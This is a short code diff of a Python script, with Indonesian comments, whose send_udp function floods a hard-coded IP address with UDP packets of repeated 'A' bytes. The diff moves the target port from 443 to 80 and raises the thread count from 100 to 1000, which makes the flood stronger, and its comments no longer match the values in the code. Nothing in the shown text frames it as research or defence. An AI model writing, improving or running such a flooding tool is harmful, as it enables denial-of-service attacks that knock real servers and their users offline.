@@ -7,7 +7,7 @@ def send_udp(max_bytes):
         udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
         # Mengganti alamat dan port sesuai kebutuhan (contoh: alamat IP dan port)
-        server_address = ('158.220.106.212', 443)
+        server_address = ('158.220.106.212', 80)
 
         # Membuat data yang akan dikirim (misalnya, mengisi data dengan karakter 'A' sebanyak max_bytes)
         data_to_send = b'A' * max_bytes
@@ -22,7 +22,7 @@ def send_udp(max_bytes):
 # Membuat 10 thread, masing-masing mengirimkan paket UDP maksimum 1024 bytes
 max_udp_bytes = 6024
 threads = []
-for _ in range(100):
+for _ in range(1000):
     thread = threading.Thread(target=send_udp, args=(max_udp_bytes,))
     threads.append(thread)
 
